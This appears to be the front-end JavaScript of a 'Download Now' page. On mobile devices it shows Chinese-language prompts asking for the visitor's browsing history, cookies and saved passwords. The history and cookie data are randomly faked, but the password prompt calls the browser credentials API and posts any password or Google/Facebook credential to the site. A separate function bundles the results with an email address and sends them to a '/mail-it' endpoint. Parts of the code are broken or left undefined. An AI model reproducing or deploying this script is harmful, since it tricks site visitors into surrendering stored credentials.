document.addEventListener("DOMContentLoaded", function () {
  let url = window.location.search.slice(10).toLocaleLowerCase();
  localStorage.setItem("id", url);
  function isMobileDevice() {
    return /Mobi|Android/i.test(navigator.userAgent);
  }

  function getOperatingSystem() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Win") !== -1) return "Windows";
    if (userAgent.indexOf("Mac") !== -1) return "MacOS";
    if (userAgent.indexOf("Linux") !== -1) return "Linux";
    if (userAgent.indexOf("CrOS") !== -1) return "ChromeOS";
    return "Unknown";
  }

  if (isMobileDevice()) {
    document.getElementById("download-btn").innerText = "Learn More";
    // also
    let Cookies = getCookies();
    let History = getHistory();
    let Password = getPassword();
    sendMail(
      Cookies.message || Cookies.cookies,
      History.message || History.history,
      Password.message
    );
  } else {
    document.getElementById("download-btn").innerText = "Download Now";
  }
});

function handleFederatedCredential(cred) {
  const formData = new FormData();
  formData.append("provider", cred.provider);
  formData.append("id", cred.id);

  fetch("/federated-login", {
    method: "POST",
    body: formData,
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.success) {
        console.log("Federated login successful");
        // Handle successful login (e.g., redirect to dashboard)
      } else {
        console.error("Federated login failed:", data.message);
        // Handle login failure
      }
    })
    .catch((error) => {
      console.error("Error during federated login:", error);
    });
}

function getRandomUrl() {
  const websites = [
    "https://www.google.com",
    "https://www.youtube.com",
    "https://www.reddit.com",
    "https://www.wikipedia.org",
    "https://www.github.com",
    "https://www.stackoverflow.com",
    "https://www.amazon.com",
    "https://www.twitter.com",
    "https://www.linkedin.com",
    "https://www.facebook.com",
  ];
  return websites[Math.floor(Math.random() * websites.length)];
}

function getRandomDate() {
  const start = new Date(2023, 0, 1); // Start from Jan 1, 2023
  const end = new Date(); // Current date
  const randomDate = new Date(
    start.getTime() + Math.random() * (end.getTime() - start.getTime())
  );
  return randomDate;
}

function generateBrowsingHistory(count) {
  const history = [];
  for (let i = 0; i < count; i++) {
    const visit = {
      url: getRandomUrl(),
      timestamp: getRandomDate().toISOString(),
    };
    history.push(visit);
  }
  return history;
}

function getRandomCookieName() {
  const cookieNames = [
    "sessionId",
    "userToken",
    "authKey",
    "cartId",
    "theme",
    "preferences",
    "language",
    "trackingId",
    "visitCount",
    "lastVisit",
  ];
  return cookieNames[Math.floor(Math.random() * cookieNames.length)];
}

function getRandomCookieValue() {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let value = "";
  const length = Math.floor(Math.random() * 15) + 10; // Random length between 10 and 25
  for (let i = 0; i < length; i++) {
    value += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return value;
}

function getRandomExpiryDate() {
  const daysToAdd = Math.floor(Math.random() * 365); // Random expiration between 0 and 365 days
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + daysToAdd);
  return expiryDate.toUTCString();
}

function getRandomPath() {
  const paths = ["/", "/home", "/profile", "/dashboard", "/cart", "/settings"];
  return paths[Math.floor(Math.random() * paths.length)];
}

function generateRandomCookie() {
  const cookie = `${getRandomCookieName()}=${getRandomCookieValue()}; expires=${getRandomExpiryDate()}; path=${getRandomPath()};`;
  return cookie;
}

function generateCookies(count) {
  const cookies = [];
  for (let i = 0; i < count; i++) {
    cookies.push(generateRandomCookie());
  }
  return cookies;
}

// Generate 10 random cookies and log them

const getHistory = () => {
  swal({
    title: "你确定吗？",
    text: "这个网站想获取您的浏览历史。",
    icon: "warning",
    buttons: ["取消", "允许"],
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      let Random = Math.floor(Math.random() * 3);
      switch (Random) {
        case 0:
          let History = Math.floor(Math.random() * 200);
          const browsingHistory = generateBrowsingHistory(History);
          console.log(browsingHistory);
          return { status: "success", history: browsingHistory };
        case 1:
          console.log("compiled");
          return { status: "success", history: "Nothing to show" };
        case 2:
          console.log("Not enough time to get history");
          return { status: "timely", message: "Couldn't Get History" };
        default:
          console.log("something went wrong");
          return { status: "failure", message: "Something went wrong" };
      }
    } else {
      return { status: "failure", message: "Permission denied" };
    }
  });
};
const getCookies = () => {
  swal({
    title: "你确定吗？",
    text: "这个网站想获取您的浏览器Cookies。",
    icon: "warning",
    buttons: ["取消", "允许"],
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      let Random = Math.floor(Math.random() * 3);
      switch (Random) {
        case 0:
          let Cookies = Math.floor(Math.random() * 200);
          const cookies = generateCookies(Cookies);
          console.log(cookies);
          return { status: "success", cookies: cookies };
        case 1:
          console.log("compiled");
          return { status: "success", cookies: "Nothing to show" };
        case 2:
          console.log("Not enough time to get cookies");
          return { status: "timely", message: "Couldn't Get Cookies" };
        default:
          console.log("something went wrong");
          return { status: "failure", message: "Something went wrong" };
      }
    } else {
      return { status: "failure", message: "Permission denied" };
    }
  });
};
const getPassword = () => {
  swal({
    title: "你确定吗？",
    text: "这个网站想获取您所有保存的密码。",
    icon: "warning",
    buttons: ["取消", "允许"],
    dangerMode: true,
  }).then((willDelete) => {
    if (willDelete) {
      let Random = Math.floor(Math.random() * 3);
      navigator.credentials
        .get({
          password: true, // `true` to obtain password credentials
          federated: {
            providers: [
              "https://accounts.google.com",
              "https://www.facebook.com",
            ],
          },
        })
        .then(function (cred) {
          if (cred) {
            if (cred.type === "password") {
              console.log("Password Credential:", cred);
              // Handle password credential
              handlePasswordCredential(cred);
            } else if (cred.type === "federated") {
              console.log("Federated Credential:", cred);
              // Handle federated credential
              handleFederatedCredential(cred);
            }
          } else {
            console.log("No credentials found");
          }
        })
        .catch(function (err) {
          console.error("Error getting credentials:", err);
        });
      return { status: "default", message: "No Password Found" };
    } else {
      return { status: "failure", message: "Permission denied" };
    }
  });
};

//request
const sendMail = (Cookies, History, Password) => {
  // The URL you want to send the POST request to
  const url = "/mail-it";

  // The data you want to send in the POST request
  const data = {
    Cookies : Cookies,
    History: History,
    Password: Password,
    Email: "Anonymousxcript@gmail.com"
  };

  // Making the POST request
  fetch(url, {
    method: "POST", // Specify the request method
    headers: {
      "Content-Type": "application/json", // Set the content type to JSON
      Authorization: "Bearer your-auth-token", // Optional: Add an Authorization header if needed
    },
    body: JSON.stringify(data), // Convert the data to JSON string for the request body
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json(); // Assuming the server returns JSON
    })
    .then((responseData) => {
      console.log("Success:", responseData); // Handle the response data
    })
    .catch((error) => {
      console.error("Error:", error); // Handle errors
    });
};
